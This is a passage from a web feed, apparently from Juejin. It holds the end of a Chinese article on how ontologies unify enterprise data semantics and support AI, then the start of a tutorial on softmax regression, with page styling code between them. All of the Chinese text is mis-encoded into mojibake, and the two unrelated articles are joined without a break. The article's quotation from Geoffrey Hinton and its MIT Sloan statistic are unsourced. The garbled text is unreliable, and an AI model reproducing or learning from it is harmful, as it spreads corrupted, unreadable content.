<p>ä»¥ä¸€å®¶ä¸­ç­‰è§„æ¨¡çš„ç”µå•†å…¬å¸ä¸ºä¾‹ï¼šå®ƒçš„CRMç³»ç»Ÿè®°å½•â€œå®¢æˆ·â€ï¼Œè®¢å•ç³»ç»Ÿæœ‰â€œä¹°å®¶â€ï¼Œå®¢æœç³»ç»Ÿè¿½è¸ªâ€œç”¨æˆ·â€ï¼Œè´¢åŠ¡ç³»ç»Ÿç®¡ç†â€œä»˜æ¬¾æ–¹â€ï¼Œè¥é”€ç³»ç»Ÿåˆ†æâ€œå—ä¼—â€â€¦â€¦å½“è¿™äº›ç³»ç»Ÿéœ€è¦ååŒå·¥ä½œæ—¶ï¼Œé—®é¢˜å°±æ¥äº†ã€‚</p>
<p>2021å¹´ï¼Œ<strong>éº»çœç†å·¥å­¦é™¢æ–¯éš†ç®¡ç†å­¦é™¢</strong>çš„ä¸€é¡¹ç ”ç©¶å‘ç°ï¼Œæ•°æ®å·¥ä½œè€…å¹³å‡<strong>èŠ±è´¹è¿‘80%çš„æ—¶é—´</strong>åœ¨æ•°æ®å‡†å¤‡å’Œæ¸…æ´—ä¸Šï¼Œå…¶ä¸­å¾ˆå¤§ä¸€éƒ¨åˆ†å°±æ˜¯åœ¨è§£å†³<strong>è¯­ä¹‰ä¸ä¸€è‡´</strong>çš„é—®é¢˜â€”â€”å³ä¸åŒç³»ç»Ÿå¯¹åŒä¸€äº‹ç‰©å®šä¹‰ä¸åŒã€‚</p>
<p>è¿™å°±æ˜¯æœ¬ä½“è®ºçš„ä»·å€¼æ‰€åœ¨ï¼šå®ƒä¸ºä¼ä¸šå»ºç«‹ä¸€å¥—<strong>ç»Ÿä¸€çš„è¯­ä¹‰æ¡†æ¶</strong>ï¼Œè®©å„ä¸ªç³»ç»Ÿè¯´â€œåŒä¸€ç§è¯­è¨€â€ã€‚</p>
<h2 data-id="heading-2">03 æœ¬ä½“è®ºå¦‚ä½•å·¥ä½œï¼Ÿä¸€ä¸ªå’–å•¡åº—çš„ä¾‹å­</h2>
<p>å‡è®¾æˆ‘ä»¬è¦ä¸ºâ€œå°ç‹å’–å•¡åº—â€å»ºç«‹ä¸€ä¸ªæ•°æ®æœ¬ä½“ã€‚</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šå®šä¹‰æ ¸å¿ƒæ¦‚å¿µï¼ˆç±»ï¼‰</strong></p>
<ul>
<li>äº§å“ï¼ˆå’–å•¡ã€ç³•ç‚¹ï¼‰</li>
<li>å‘˜å·¥ï¼ˆå’–å•¡å¸ˆã€æ”¶é“¶å‘˜ï¼‰</li>
<li>å®¢æˆ·ï¼ˆä¼šå‘˜ã€æ•£å®¢ï¼‰</li>
<li>è®¢å•ï¼ˆå ‚é£Ÿã€å¤–å–ï¼‰</li>
</ul>
<p><strong>ç¬¬äºŒæ­¥ï¼šæ˜ç¡®å±æ€§ï¼ˆæ•°æ®å­—æ®µï¼‰</strong></p>
<ul>
<li>äº§å“ï¼šåç§°ã€ä»·æ ¼ã€æˆåˆ†ã€çƒ­é‡</li>
<li>å®¢æˆ·ï¼šå§“åã€ä¼šå‘˜ç­‰çº§ã€åå¥½å£å‘³ã€æ¶ˆè´¹æ€»é¢</li>
</ul>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šå»ºç«‹å…³ç³»ï¼ˆè¿æ¥ï¼‰</strong></p>
<ul>
<li>â€œå®¢æˆ·â€ <strong>è´­ä¹°</strong> â€œäº§å“â€ï¼ˆå½¢æˆè®¢å•ï¼‰</li>
<li>â€œå‘˜å·¥â€ <strong>åˆ¶ä½œ</strong> â€œäº§å“â€</li>
<li>â€œæ‹¿é“â€ <strong>æ˜¯ä¸€ç§</strong> â€œå’–å•¡â€</li>
</ul>
<p><strong>ç¬¬å››æ­¥ï¼šè®¾å®šè§„åˆ™ï¼ˆçº¦æŸï¼‰</strong></p>
<ul>
<li>ä¸€ä¸ªè®¢å•å¿…é¡»è‡³å°‘åŒ…å«ä¸€ä¸ªäº§å“</li>
<li>ä¼šå‘˜ç­‰çº§æ ¹æ®æ¶ˆè´¹æ€»é¢è‡ªåŠ¨è°ƒæ•´</li>
</ul>
<p>è¿™æ ·ï¼Œå½“è€æ¿é—®â€œå“ªç§å’–å•¡æœ€å—25-30å²å¥³æ€§ä¼šå‘˜æ¬¢è¿ï¼Ÿâ€æ—¶ï¼Œç³»ç»Ÿå°±èƒ½å‡†ç¡®ç†è§£é—®é¢˜ï¼Œä»è®¢å•ä¸­æ‰¾å‡ºç¬¦åˆæ¡ä»¶çš„è®°å½•ï¼Œè€Œä¸ä¼šæŠŠâ€œå’–å•¡è±†â€è¿™ç§åŸæ–™ä¹Ÿç®—ä½œâ€œå’–å•¡â€ã€‚</p>
<h2 data-id="heading-3">04 æœ¬ä½“è®ºä¸AIï¼šä¸æ˜¯æ›¿ä»£ï¼Œè€Œæ˜¯èµ‹èƒ½</h2>
<p>æœ‰äººå¯èƒ½ä¼šé—®ï¼šç°åœ¨å¤§è¯­è¨€æ¨¡å‹è¿™ä¹ˆå¼ºå¤§ï¼Œè¿˜éœ€è¦æœ¬ä½“è®ºå—ï¼Ÿ</p>
<p>è¿™å…¶å®æ˜¯ä¸€ä¸ªç¾ä¸½çš„è¯¯è§£ã€‚å¤§æ¨¡å‹å°±åƒä¸€ä¸ªåšè§ˆç¾¤ä¹¦ä½†ç¼ºä¹ä¸“ä¸šè®­ç»ƒçš„é€šæ‰ï¼Œè€Œæœ¬ä½“è®ºåˆ™æä¾›ä¸“ä¸šçš„<strong>é¢†åŸŸçŸ¥è¯†æ¡†æ¶</strong>ã€‚</p>
<p><strong>æ°å¼—é‡ŒÂ·è¾›é¡¿</strong>ï¼Œæ·±åº¦å­¦ä¹ å…ˆé©±ï¼Œæ›¾æŒ‡å‡ºï¼šâ€œç¥ç»ç½‘ç»œèƒ½ä»æ•°æ®ä¸­å­¦ä¹ æ¨¡å¼ï¼Œä½†å®ƒä»¬ä¸å­¦ä¹ è¯­ä¹‰ã€‚â€è¿™æ„å‘³ç€ï¼ŒAIå¯ä»¥ä»å¤§é‡æ–‡æœ¬ä¸­å­¦ä¼šâ€œå®¢æˆ·â€è¿™ä¸ªè¯å¸¸ä¸â€œè´­ä¹°â€ã€â€œæœåŠ¡â€ç­‰è¯ä¸€èµ·å‡ºç°ï¼Œä½†å®ƒæ— æ³•ç†è§£ä½ ä»¬å…¬å¸â€œå®¢æˆ·â€çš„ç‰¹å®šå®šä¹‰å’Œåˆ†ç±»ä½“ç³»ã€‚</p>
<p>æœ¬ä½“è®ºæ°æ°å¼¥è¡¥äº†è¿™ä¸€ç¼ºé™·ï¼šå®ƒå°†äººç±»å¯¹é¢†åŸŸçš„ç†è§£<strong>å½¢å¼åŒ–</strong>ï¼Œä¸ºAIæä¾›äº†å‡†ç¡®çš„çŸ¥è¯†é”šç‚¹ã€‚è¿™å°±åƒç»™ä¸€ä½å¤©æ‰ä½†å¥å¿˜çš„å­¦è€…ä¸€æœ¬ç²¾å¿ƒç¼–æ’çš„ä¸“ä¸šè¯å…¸ã€‚</p>
<p>åœ¨åŒ»ç–—é¢†åŸŸï¼Œæœ¬ä½“è®ºçš„ä»·å€¼å°¤ä¸ºæ˜æ˜¾ã€‚<strong>SNOMED CTï¼ˆç³»ç»ŸåŒ–ä¸´åºŠåŒ»å­¦æœ¯è¯­é›†ï¼‰</strong> æ˜¯å…¨çƒæœ€å…¨é¢çš„ä¸´åºŠåŒ»ç–—æœ¯è¯­æœ¬ä½“ï¼ŒåŒ…å«35ä¸‡å¤šä¸ªæ¦‚å¿µã€‚å®ƒç¡®ä¿â€œå¿ƒè‚Œæ¢—æ­»â€ã€â€œå¿ƒè„ç—…å‘ä½œâ€ã€â€œMIâ€ï¼ˆåŒ»å­¦æœ¯è¯­ç¼©å†™ï¼‰éƒ½è¢«æ­£ç¡®å…³è”ï¼Œé¿å…AIå› æœ¯è¯­å·®å¼‚è€Œè¯¯åˆ¤ç—…æƒ…ã€‚</p>
<h2 data-id="heading-4">05 å®é™…åº”ç”¨ï¼šå½“æœ¬ä½“è®ºèµ°è¿›å„è¡Œå„ä¸š</h2>
<p><strong>åœ¨é‡‘èé¢†åŸŸ</strong>ï¼šé“¶è¡Œä½¿ç”¨æœ¬ä½“è®ºæ•´åˆå®¢æˆ·æ•°æ®ã€‚ä¸€ä½å®¢æˆ·å¯èƒ½æœ‰å‚¨è“„è´¦æˆ·ã€ä¿¡ç”¨å¡ã€æˆ¿è´·ã€ç†è´¢äº§å“ï¼Œåˆ†æ•£åœ¨ä¸åŒç³»ç»Ÿä¸­ã€‚é€šè¿‡å»ºç«‹â€œé‡‘èäº§å“æœ¬ä½“â€ï¼Œé“¶è¡Œèƒ½å¤Ÿ360åº¦å…¨é¢äº†è§£å®¢æˆ·ï¼Œæä¾›ä¸ªæ€§åŒ–æœåŠ¡ï¼ŒåŒæ—¶æ»¡è¶³ç›‘ç®¡è¦æ±‚çš„â€œå®¢æˆ·èº«ä»½è¯†åˆ«â€ã€‚</p>
<p><strong>åœ¨åˆ¶é€ ä¸š</strong>ï¼šè¥¿é—¨å­ç­‰å…¬å¸ä½¿ç”¨<strong>å·¥ä¸šæœ¬ä½“è®º</strong>ï¼Œå°†è®¾è®¡ã€ç”Ÿäº§ã€ä¾›åº”é“¾æ•°æ®ç»Ÿä¸€èµ·æ¥ã€‚å½“è®¾è®¡éƒ¨é—¨ä¿®æ”¹ä¸€ä¸ªé›¶ä»¶å‚æ•°ï¼Œåˆ¶é€ ç³»ç»Ÿèƒ½è‡ªåŠ¨è¯†åˆ«å“ªäº›ç”Ÿäº§çº¿éœ€è¦è°ƒæ•´ï¼Œé‡‡è´­ç³»ç»ŸçŸ¥é“è¯¥è®¢è´­ä»€ä¹ˆæ–°ææ–™ã€‚</p>
<p><strong>åœ¨å†…å®¹è¡Œä¸š</strong>ï¼šBBCä½¿ç”¨æœ¬ä½“è®ºç®¡ç†å…¶æµ·é‡çš„åª’ä½“èµ„äº§ã€‚å½“è®°è€…æœç´¢â€œæ°”å€™å˜åŒ–â€ï¼Œç³»ç»Ÿä¸ä»…èƒ½æ‰¾åˆ°ç›¸å…³è§†é¢‘ã€æ–‡ç« ï¼Œè¿˜èƒ½å…³è”åˆ°ç›¸å…³çš„ä¸“å®¶è®¿è°ˆã€å†å²èƒŒæ™¯ï¼Œç”šè‡³æ¨èç›¸ä¼¼çš„æŠ¥é“è§’åº¦ï¼Œå› ä¸ºæœ¬ä½“å®šä¹‰äº†è¿™äº›å†…å®¹ä¹‹é—´çš„æ·±å±‚å…³ç³»ã€‚</p>
<p><strong>åœ¨ç§‘å­¦ç ”ç©¶ä¸­</strong>ï¼š<strong>åŸºå› æœ¬ä½“è®º</strong>ä¸ºç”Ÿç‰©å­¦ç ”ç©¶æä¾›äº†æ ‡å‡†æœ¯è¯­ï¼Œå…¨çƒç§‘å­¦å®¶ä½¿ç”¨åŒä¸€å¥—è¯­è¨€æè¿°åŸºå› åŠŸèƒ½ï¼Œä½¿ä¸åŒå®éªŒå®¤çš„ç ”ç©¶ç»“æœå¯ä»¥æ¯”è¾ƒã€æ•´åˆï¼Œæå¤§åŠ é€Ÿäº†ç”Ÿå‘½ç§‘å­¦çš„è¿›æ­¥ã€‚</p>
<h2 data-id="heading-5">06 æ„å»ºæœ¬ä½“è®ºï¼šä¸æ˜¯æŠ€æœ¯æŒ‘æˆ˜ï¼Œè€Œæ˜¯æ²Ÿé€šè‰ºæœ¯</h2>
<p>è®¸å¤šäººè¯¯ä»¥ä¸ºæ„å»ºæœ¬ä½“è®ºä¸»è¦æ˜¯æŠ€æœ¯å·¥ä½œã€‚å®é™…ä¸Šï¼Œ<strong>80%çš„æŒ‘æˆ˜æ¥è‡ªç»„ç»‡æ²Ÿé€šå’Œå…±è¯†å»ºç«‹</strong>ã€‚</p>
<p>ä¸€ä¸ªæˆåŠŸçš„æœ¬ä½“è®ºé¡¹ç›®å¾€å¾€éµå¾ªè¿™æ ·çš„è·¯å¾„ï¼š</p>
<ol>
<li>
<p><strong>ä»å°å¤„å¼€å§‹</strong>ï¼šé€‰æ‹©ä¸€ä¸ªæœ‰é™ä½†é‡è¦çš„é¢†åŸŸï¼ˆå¦‚â€œå®¢æˆ·æ•°æ®â€æˆ–â€œäº§å“ç›®å½•â€ï¼‰ï¼Œè€Œä¸æ˜¯è¯•å›¾ä¸€æ¬¡æ€§è¦†ç›–æ•´ä¸ªä¼ä¸šã€‚</p>
</li>
<li>
<p><strong>è·¨éƒ¨é—¨åä½œ</strong>ï¼šç»„ç»‡æ¥è‡ªä¸šåŠ¡ã€æŠ€æœ¯ã€æ•°æ®åˆ†æçš„ä¸“å®¶ç»„æˆâ€œæœ¬ä½“å§”å‘˜ä¼šâ€ï¼Œå…±åŒå®šä¹‰æ¦‚å¿µã€‚</p>
</li>
<li>
<p><strong>è¿­ä»£å‘å±•</strong>ï¼šæœ¬ä½“è®ºä¸æ˜¯ä¸€æ¬¡æ€§çš„é¡¹ç›®ï¼Œè€Œåº”éšç€ä¸šåŠ¡å‘å±•ä¸æ–­æ¼”è¿›ã€‚å°±åƒè¯­è¨€æœ¬èº«ä¼šéšç€ç¤¾ä¼šå˜åŒ–è€Œå‘å±•ä¸€æ ·ã€‚</p>
</li>
<li>
<p><strong>å·¥å…·æ”¯æŒ</strong>ï¼šä½¿ç”¨ä¸“é—¨çš„æœ¬ä½“ç¼–è¾‘å·¥å…·ï¼ˆå¦‚ProtÃ©gÃ©ï¼‰æˆ–æ•°æ®ç›®å½•äº§å“ä¸­çš„æœ¬ä½“åŠŸèƒ½ï¼Œè®©æ„å»ºå’Œç»´æŠ¤æ›´åŠ é«˜æ•ˆã€‚</p>
</li>
</ol>
<h2 data-id="heading-6">07 æœªæ¥å±•æœ›ï¼šæœ¬ä½“è®ºçš„ä¸‹ä¸€ä¸ªåå¹´</h2>
<p>éšç€æ•°æ®é‡çš„æŒç»­çˆ†ç‚¸å’ŒAIåº”ç”¨çš„æ·±å…¥ï¼Œæœ¬ä½“è®ºçš„é‡è¦æ€§åªä¼šå¢åŠ ã€‚æœªæ¥å¯èƒ½ä¼šæœ‰ä»¥ä¸‹è¶‹åŠ¿ï¼š</p>
<p><strong>è‡ªåŠ¨åŒ–æœ¬ä½“æ„å»º</strong>ï¼šAIå°†å¸®åŠ©è‡ªåŠ¨å‘ç°æ•°æ®ä¸­çš„æ¦‚å¿µå’Œå…³ç³»ï¼ŒåŠ é€Ÿæœ¬ä½“åˆ›å»ºè¿‡ç¨‹ï¼Œä½†äººç±»ä¸“å®¶çš„å®¡æŸ¥å’Œç¡®è®¤ä»ä¸å¯æˆ–ç¼ºã€‚</p>
<p><strong>åŠ¨æ€æœ¬ä½“é€‚åº”</strong>ï¼šæœ¬ä½“å°†å˜å¾—æ›´åŠ çµæ´»ï¼Œèƒ½å¤Ÿæ ¹æ®æ–°çš„æ•°æ®æ¨¡å¼å’Œä½¿ç”¨æƒ…å†µè‡ªæˆ‘è°ƒæ•´å’Œæ‰©å±•ã€‚</p>
<p><strong>è·¨ç»„ç»‡æœ¬ä½“äº¤æ¢</strong>ï¼šè¡Œä¸šæ ‡å‡†æœ¬ä½“å°†ä¿ƒè¿›ä¸åŒç»„ç»‡é—´çš„æ•°æ®äº¤æ¢å’Œåä½œï¼Œç‰¹åˆ«æ˜¯åœ¨ä¾›åº”é“¾ã€åŒ»ç–—ç ”ç©¶ç­‰é¢†åŸŸã€‚</p>
<p><strong>ä¸çŸ¥è¯†å›¾è°±æ·±åº¦èåˆ</strong>ï¼šæœ¬ä½“è®ºä¸ºçŸ¥è¯†å›¾è°±æä¾›éª¨æ¶ï¼ŒçŸ¥è¯†å›¾è°±åˆ™æ˜¯æœ¬ä½“çš„å…·ä½“å®ç°ï¼Œä¸¤è€…çš„ç»“åˆå°†åˆ›é€ çœŸæ­£çš„â€œä¼ä¸šçŸ¥è¯†å¤§è„‘â€ã€‚</p>
<hr/>
<h2 data-id="heading-7">ç»“è¯­</h2>
<p>1955å¹´ï¼Œ<strong>è®¡ç®—æœºç§‘å­¦å…ˆé©±çº¦ç¿°Â·éº¦å¡é”¡</strong>åœ¨æå‡ºâ€œäººå·¥æ™ºèƒ½â€è¿™ä¸€æœ¯è¯­æ—¶ï¼Œå°±é¢„è§åˆ°éœ€è¦ä¸€ç§â€œå½¢å¼åŒ–çŸ¥è¯†â€çš„æ–¹æ³•æ¥è®©æœºå™¨çœŸæ­£ç†è§£ä¸–ç•Œã€‚è¿‘70å¹´åï¼Œæˆ‘ä»¬ç»ˆäºæœ‰äº†å®è·µè¿™ä¸€æ„¿æ™¯çš„å·¥å…·ã€‚</p>
<p>æœ¬ä½“è®ºï¼Œè¿™ä¸ªæºè‡ªå¤è€å“²å­¦çš„æ¦‚å¿µï¼Œåœ¨ç°ä»£æ•°æ®ä¸–ç•Œä¸­æ‰¾åˆ°äº†æ–°çš„ç”Ÿå‘½åŠ›ã€‚å®ƒä¸è¿½æ±‚ç‚«é…·çš„æŠ€æœ¯å±•ç¤ºï¼Œè€Œæ˜¯é»˜é»˜åšç€<strong>æœ€åŸºç¡€ã€æœ€é‡è¦çš„å·¥ä½œ</strong>ï¼šä¸ºæ··ä¹±çš„æ•°æ®ä¸–ç•Œå»ºç«‹ç§©åºï¼Œä¸ºæ™ºèƒ½ç³»ç»Ÿæä¾›ç†è§£çš„åŸºçŸ³ã€‚</p>
<p>åœ¨ä¸€ä¸ªäººäººè°ˆè®ºAIçš„æ—¶ä»£ï¼Œæˆ–è®¸æˆ‘ä»¬éœ€è¦æ›´å¤šå…³æ³¨è¿™äº›<strong>è®©AIçœŸæ­£å˜å¾—æœ‰ç”¨çš„â€œåŸºç¡€è®¾æ–½â€</strong>ã€‚æ¯•ç«Ÿï¼Œå†èªæ˜çš„å¤´è„‘ï¼Œä¹Ÿéœ€è¦æ¸…æ™°çš„æ¦‚å¿µå’Œè¯­è¨€æ¥æ€è€ƒä¸è¡¨è¾¾ã€‚</p>
<p>è€Œè¿™å°±æ˜¯æœ¬ä½“è®ºç»™æˆ‘ä»¬çš„å¯ç¤ºï¼š<strong>åœ¨è®©æœºå™¨å˜å¾—æ›´åƒäººä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è®©äººâ€”â€”ä»¥åŠäººåˆ›é€ çš„æ•°æ®â€”â€”èƒ½å¤Ÿè¢«æ¸…æ™°ç†è§£ã€‚</strong> è¿™ä¸æ˜¯æŠ€æœ¯çš„èƒœåˆ©ï¼Œè€Œæ˜¯äººç±»æ²Ÿé€šæ™ºæ…§çš„å»¶ä¼¸ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[D2L(2) â€” softmaxå›å½’]]></title>    <link>https://juejin.cn/post/7595150851477438507</link>    <guid>https://juejin.cn/post/7595150851477438507</guid>    <pubDate>2026-01-15T09:01:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595150851477438507" data-draft-id="7580378958072512522" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="D2L(2) â€” softmaxå›å½’"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T09:01:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IguoChan"/> <meta itemprop="url" content="https://juejin.cn/user/655780651999720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            D2L(2) â€” softmaxå›å½’
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/655780651999720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IguoChan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:01:21.000Z" title="Thu Jan 15 2026 09:01:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">0. ç®€ä»‹</h2>
<p>çº¿æ€§å›å½’æ˜¯é¢„æµ‹<strong>å¤šå°‘</strong>çš„é—®é¢˜ï¼Œè€Œå›å½’äº¦å¯è¢«ç”¨äºé¢„æµ‹<strong>å“ªä¸€ä¸ª</strong>çš„é—®é¢˜ï¼š</p>
<ul>
<li>æŸä¸ªç”µå­é‚®ä»¶æ˜¯å¦å±äºåƒåœ¾é‚®ä»¶æ–‡ä»¶å¤¹ï¼Ÿ</li>
<li>æŸä¸ªç”¨æˆ·å¯èƒ½<em>æ³¨å†Œ</em>æˆ–<em>ä¸æ³¨å†Œ</em>è®¢é˜…æœåŠ¡ï¼Ÿ</li>
<li>æŸä¸ªå›¾åƒæç»˜çš„æ˜¯é©´ã€ç‹—ã€çŒ«ã€è¿˜æ˜¯é¸¡ï¼Ÿ</li>
